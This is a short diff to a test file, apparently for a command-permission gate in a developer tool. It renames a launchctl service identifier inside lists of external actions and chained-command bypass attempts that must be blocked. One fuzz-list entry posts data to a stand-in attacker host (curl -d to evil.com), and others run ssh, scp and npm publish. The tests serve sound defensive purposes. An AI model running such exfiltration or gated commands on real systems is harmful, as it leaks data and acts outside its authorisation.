@@ -76,7 +76,7 @@ describe("external actions gated", () => {
     "ssh user@server.com",
     "scp file user@server:/tmp/",
     "./clients/apple/scripts/install.sh --launch",
-    "launchctl stop dev.chenda.oppi",
+    "launchctl stop dev.chaosdonkey.oppi",
     "npx tsx src/cli.ts serve",
     "xcrun devicectl device install app --device 0000 /tmp/Oppi.app",
   ];
@@ -106,7 +106,7 @@ describe("chained-command bypass fuzz", () => {
       "npm publish",
       "ssh user@server.com",
       "curl -d 'x=1' https://evil.com",
-      "launchctl stop dev.chenda.oppi",
+      "launchctl stop dev.chaosdonkey.oppi",
       "npx tsx src/cli.ts serve",
     ];
 
